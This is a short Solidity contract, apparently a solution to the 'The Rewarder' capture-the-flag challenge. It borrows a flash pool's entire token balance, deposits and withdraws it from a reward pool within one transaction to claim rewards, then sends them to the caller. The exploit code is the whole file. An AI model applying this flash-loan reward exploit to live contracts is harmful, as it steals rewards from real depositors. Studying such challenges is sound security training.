// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
// import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract Attacker_the_rewarder {
    FlashLoanerPool public flashloan_contract;
    TheRewarderPool public reward_pool;
    RewardToken public reward_token;
    DamnValuableToken public dvt;

    constructor(
        FlashLoanerPool _loan,
        TheRewarderPool _reward,
        RewardToken _reward_token,
        DamnValuableToken _dvt
    ) {
        flashloan_contract = _loan;
        reward_pool = _reward;
        reward_token = _reward_token;
        dvt = _dvt;
    }

    function attack() external {
        flashloan_contract.flashLoan(
            dvt.balanceOf(address(flashloan_contract))
        );
        reward_token.transfer(
            msg.sender,
            reward_token.balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(reward_pool), amount);
        reward_pool.deposit(amount);
        reward_pool.withdraw(amount);
        dvt.transfer(address(flashloan_contract), amount);
    }
}
